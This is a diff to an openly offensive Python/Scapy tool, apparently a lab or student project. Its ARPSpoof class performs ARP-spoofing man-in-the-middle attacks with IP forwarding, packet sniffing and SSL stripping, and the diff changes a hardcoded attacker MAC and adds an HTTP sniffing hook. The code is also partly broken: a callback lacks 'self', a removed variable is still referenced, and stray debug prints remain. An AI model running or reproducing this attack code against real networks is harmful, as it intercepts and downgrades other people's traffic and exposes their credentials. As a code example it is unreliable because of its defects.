@@ -2,6 +2,9 @@ from scapy.all import *
 from scapy.layers import *
 from scapy.layers.inet import IP
 from dns_spoofing import *
+import scapy.all as scapy
+from scapy.layers import http
+import argparse
 import threading
 import time
 import socket
@@ -18,6 +21,18 @@ from utils.interface import InterfaceConfig
 
 class ARPSpoof(threading.Thread):
     SSL_Strip_Activation = False
+    
+    def disableForwarding(self):
+    	path = "/proc/sys/net/ipv4/ip_forward"
+    	forwarding = open(path, "w")
+    	forwarding.write("0")
+    	forwarding.close
+
+    def enableForwarding(self):
+    	path = "/proc/sys/net/ipv4/ip_forward"
+    	forwarding = open(path, "w")
+    	forwarding.write("1")
+    	forwarding.close
  
     def __init__(
         self,
@@ -61,13 +76,13 @@ class ARPSpoof(threading.Thread):
 
         if self.mitm:
             print("\n Enabling IP Forwarding (MitM attack)...")
-            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+            self.enableForwarding()
         else:
             # Disable ip forward
-            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-            print("closed")
+            self.disableForwarding()
+            print("Disabled Forwarding")
 
-        ATTACKER_MAC = '08:00:27:db:96:6a' 
+        ATTACKER_MAC = '08:00:27:e0:e3:10' 
         #print(ATTACKER_MAC)
         tic = -1
         
@@ -108,13 +123,23 @@ class ARPSpoof(threading.Thread):
             
         return
 
+    def process_sniffed_packet(packet):
+        if packet.haslayer(http.HTTPRequest):
+            url = packet[http.HTTPRequest].Host
+    
+        
     def packet_forwarding(self):
-        packet = sniff(iface = 'eth0', filter = "tcp", count = 1)
-        print(packet.summary())
+        
+        scapy.sniff("eth0",	prn=process_sniffed_packet)
+        print("DAMEs RE") 
+        #if packet.haslayer(http.HTTPResponse):
+            #if(packet[http.HTTPResponse].Status_Code == "301") and (packet[http.HTTPResponse].Location[4] == "s"): #testing if the redirect is towards an httpS url
+             #   print("location MOVED")            
+        #print(packet.summary())
         print("DAME RE") 
         self.SSL_Strip_Activation = True
         if self.SSL_Strip_Activation:
-            if packet.haslayer(HTTPRequest):
+            if packet.haslayer(http.HTTPRequest):
                 self.ssl_strip(packet)
                 print("DAME E") 
                 print('SSL Strip started')
@@ -199,7 +224,7 @@ class ARPSpoof(threading.Thread):
         print('HTTP response sent')
 
     def restore_arp(self):
-        ATTACKER_MAC = '08:00:27:db:96:6a'
+        ATTACKER_MAC = '08:00:27:e0:e3:10'
         VICTIM1_MAC = getmacbyip(self.victim1_ip)
         VICTIM2_MAC = getmacbyip(self.victim2_ip)
         print(VICTIM1_MAC)
